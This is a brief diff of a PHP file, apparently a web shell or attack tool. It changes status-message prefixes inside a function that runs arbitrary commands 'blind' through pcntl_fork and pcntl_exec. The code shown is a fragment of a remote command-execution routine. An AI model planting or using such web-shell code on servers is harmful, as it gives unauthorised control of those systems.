@@ -73,13 +73,13 @@ function execute($cmd)
         $res = '[~] Blind Command Execution via [pcntl_exec]\n\n';
         $pid = @pcntl_fork();
         if ($pid == -1)
-            $res .= '[-] Could not children fork. Exit';
+            $res .= '[!] Could not children fork. Exit';
         elseif ($pid)
         {
             if (@pcntl_wifexited($status))
                 $res .= '[+] Done! Command "' . $cmd . '" successfully executed.';
             else
-                $res .= '[-] Error. Command incorrect.';
+                $res .= '[!] Error. Command incorrect.';
         }
         else
         {
